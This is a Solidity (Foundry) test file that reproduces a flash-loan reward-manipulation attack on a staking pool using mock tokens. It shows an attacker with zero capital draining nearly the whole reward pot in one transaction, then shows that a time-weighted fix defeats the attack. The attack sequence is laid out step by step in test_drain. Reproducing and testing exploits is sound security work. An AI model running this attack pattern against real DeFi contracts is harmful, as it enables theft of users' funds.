// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {IERC20} from "../src/IERC20.sol";
import {IStakingPool} from "../src/IStakingPool.sol";
import {StakingPool} from "../src/StakingPool.sol";
import {StakingPoolFixed} from "../src/StakingPoolFixed.sol";
import {FlashLender} from "../src/FlashLender.sol";
import {Attacker} from "../src/Attacker.sol";

/// @notice Reproduces flash-loan reward manipulation, and proves time-weighting kills it.
contract RewardManipTest is Test {
    MockERC20 lp;
    MockERC20 rwd;
    address honest = makeAddr("honest");

    uint256 constant POT          = 100_000e18;   // reward pot the pool hands out
    uint256 constant HONEST_STAKE =   1_000e18;   // a real, long-term staker
    uint256 constant FLASH        = 10_000_000e18;// borrowed for free, repaid same tx

    function setUp() public {
        lp  = new MockERC20("LP Token", "LP");
        rwd = new MockERC20("Reward",  "RWD");
    }

    // -----------------------------------------------------------------------
    // EXPLOIT: instantaneous-share rewards let a flash-loaned whale scoop the pot
    // -----------------------------------------------------------------------
    function test_drain() public {
        StakingPool pool = new StakingPool(IERC20(address(lp)), IERC20(address(rwd)));

        // Fund the reward pot.
        rwd.mint(address(this), POT);
        rwd.approve(address(pool), type(uint256).max);
        pool.fund(POT);

        // An honest staker is already in the pool.
        lp.mint(honest, HONEST_STAKE);
        vm.startPrank(honest);
        lp.approve(address(pool), type(uint256).max);
        pool.stake(HONEST_STAKE);
        vm.stopPrank();

        // The flash lender holds a big pile of the LP token.
        FlashLender lender = new FlashLender(IERC20(address(lp)));
        lp.mint(address(lender), FLASH);

        Attacker atk = new Attacker(IERC20(address(lp)), IERC20(address(rwd)), IStakingPool(address(pool)), lender);

        // Attacker starts with ZERO capital of either token.
        assertEq(lp.balanceOf(address(atk)),  0, "attacker has no LP");
        assertEq(rwd.balanceOf(address(atk)), 0, "attacker has no reward");

        atk.attack(FLASH);   // borrow -> stake -> claim -> unstake -> repay, one tx

        uint256 loot = rwd.balanceOf(address(atk));
        console.log("attacker reward stolen :", loot / 1e18);
        console.log("reward pot remaining   :", pool.rewardReserve() / 1e18);
        console.log("honest staker can claim:", pool.rewardReserve() / 1e18);

        // Scooped ~the entire pot from zero capital...
        assertGt(loot, POT * 999 / 1000, "attacker took ~the whole pot");
        // ...and repaid the flash loan (holds no LP).
        assertEq(lp.balanceOf(address(atk)), 0, "flash loan repaid");
    }

    // -----------------------------------------------------------------------
    // FIX: time-weighted rewards -> a same-block stake earns nothing
    // -----------------------------------------------------------------------
    function test_fixed() public {
        StakingPoolFixed pool = new StakingPoolFixed(IERC20(address(lp)), IERC20(address(rwd)));

        rwd.mint(address(this), POT);
        rwd.approve(address(pool), type(uint256).max);
        pool.fund(POT, 1e18);    // 1 reward/sec

        lp.mint(honest, HONEST_STAKE);
        vm.startPrank(honest);
        lp.approve(address(pool), type(uint256).max);
        pool.stake(HONEST_STAKE);
        vm.stopPrank();

        FlashLender lender = new FlashLender(IERC20(address(lp)));
        lp.mint(address(lender), FLASH);

        Attacker atk = new Attacker(IERC20(address(lp)), IERC20(address(rwd)), IStakingPool(address(pool)), lender);
        atk.attack(FLASH);       // same flash-loan attack, same block

        uint256 loot = rwd.balanceOf(address(atk));
        console.log("attacker reward on FIXED pool:", loot);
        assertEq(loot, 0, "same-block stake earns zero time-weighted reward");
    }
}
